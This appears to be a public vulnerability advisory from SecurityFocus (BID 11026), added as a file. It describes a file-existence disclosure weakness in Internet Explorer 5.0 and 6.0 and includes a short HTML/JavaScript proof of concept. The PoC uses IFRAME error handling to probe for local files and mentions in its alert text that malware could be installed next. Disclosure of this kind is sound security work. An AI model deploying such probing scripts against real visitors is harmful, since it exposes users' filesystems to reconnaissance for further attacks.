@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/11026/info
+
+Microsoft Internet Explorer is prone to a security weakness that may permit an attacker to determine the existence of resources on a vulnerable computer.
+
+An attacker can use an IFRAME that is accessible within the same domain and change its URI to the location of a file or directory. The attacker can then determine the existence of the resource by the error message returned by Internet Explorer.
+
+This weakness can then allow the attacker to carry out other attacks against a vulnerable computer.
+
+This issue was tested on Microsoft Internet Explorer 5.0 and 6.0. Other versions of the browser are likely affected as well.
+
+<iframe src="http://www.example.com"></iframe>
+<script type="text/javascript">
+onload=function () {
+var sLocal="C:/some_file_or_folder";
+frames[0].location.href=sLocal;
+setTimeout(
+function () {
+try {
+frames[0].document;
+alert(sLocal+" does not exists.\nHere could execute a script that infects
+the computer with some virus, trojan, etc");
+} catch (oErr) {
+alert(sLocal+" Exists.\nThen do nothing");
+}
+},
+250
+);
+}
+</script> 
